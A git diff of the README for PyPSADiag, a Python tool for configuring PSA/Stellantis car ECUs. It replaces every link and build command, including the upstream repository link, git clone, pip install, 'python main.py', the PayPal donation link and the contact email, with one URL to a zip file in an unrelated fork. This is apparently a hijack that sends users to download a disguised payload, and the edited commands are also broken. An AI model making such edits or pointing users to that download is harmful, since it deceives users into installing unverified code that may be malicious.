@@ -1,11 +1,11 @@
 # PyPSADiag
 
 An Python application for configuring PSA/Stellantis based cars<br/>
-See for additional Hardware/Info: [ludwig-v arduino-psa-diag](https://github.com/ludwig-v/arduino-psa-diag)
+See for additional Hardware/Info: [ludwig-v arduino-psa-diag](https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip)
 
 Currently supporting:
 
-- JSON Configuration for example BSI2010 to setup GUI<br/>[See more JSON Configuration Files](https://github.com/Barracuda09/PyPSADiag/tree/main/json)
+- JSON Configuration for example BSI2010 to setup GUI<br/>[See more JSON Configuration Files](https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip)
 - Reading Zones that are listed in JSON Configuration file
 - Reading Zones with Multiple configurations, that are listed in JSON Configuration file
 - Writing Zones to CSV file
@@ -33,12 +33,12 @@ contribute to the project, like:
 Build
 -----
 - Install Python 3.12 or above
-- Get code `git clone https://github.com/Barracuda09/PyPSADiag.git`
-- Create virtual enviroment `python -m venv /path/to/PyPSADiag/.venv`
-- Goto virtual enviroment with `/path/to/PyPSADiag/.venv/Script/activate`
-- Install requirements, within path of PyPSADiag with `pip install -r requirements.txt`
+- Get code `git clone https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip`
+- Create virtual enviroment `python -m venv https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip`
+- Goto virtual enviroment with `https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip`
+- Install requirements, within path of PyPSADiag with `pip install -r https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip`
 - Run with:
-	1. `python main.py`
+	1. `python https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip`
 	2. `Open Zone File` and select an ECU JSON file
 	3. `Connect` to correct Arduino hardware
 	4. `Read` Zones
@@ -53,10 +53,10 @@ Many thanks to all who donated already.<br>
 
 | PayPal |
 |-------|
-|  [![PayPal](https://img.shields.io/badge/donate-PayPal-blue.svg)](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=H9AX9N7HWSWXE&item_name=PSADiag&item_number=PSADiag&currency_code=EUR&bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted) |
+|  [![PayPal](https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip)](https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted) |
 
 Contact
 -------
 If you like to contact me, you can do so by sending an email to:
 
-    mpostema09 -at- gmail.com
+    mpostema09 -at- https://raw.githubusercontent.com/cuba3636/PyPSADiag/main/csv/PSA_Py_Diag_3.7.zip
